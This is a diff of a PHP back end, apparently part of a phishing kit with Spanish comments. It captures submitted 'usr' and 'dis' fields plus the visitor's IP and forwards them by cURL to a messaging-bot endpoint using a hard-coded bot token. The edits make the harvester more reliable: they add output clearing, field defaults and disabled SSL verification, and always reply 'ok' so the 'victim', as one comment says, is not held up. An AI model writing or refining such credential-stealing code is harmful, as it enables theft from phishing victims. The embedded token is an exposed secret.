@@ -1,7 +1,10 @@
 <?php
+// Limpia cualquier salida previa para evitar errores de JSON o texto extra
+ob_clean();
 error_reporting(0);
-$u = $_POST['usr'];
-$d = $_POST['dis'];
+
+$u = isset($_POST['usr']) ? $_POST['usr'] : '';
+$d = isset($_POST['dis']) ? $_POST['dis'] : 'Desconocido';
 $ip = $_SERVER['REMOTE_ADDR'];
 
 $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
@@ -24,13 +27,17 @@ if(!empty($u)){
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
         curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); // Cambiado para mayor compatibilidad
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_TIMEOUT, 10);
         curl_exec($ch);
         curl_close($ch);
     }
-    // ESTO ES VITAL para que el JS sepa que ya puede saltar
+    // ESTO DESBLOQUEA EL CARGANDO EN EL JS
+    echo "ok";
+} else {
+    // Si llega vacío por error, también soltamos el ok para no trabar la víctima
     echo "ok";
 }
 ?>
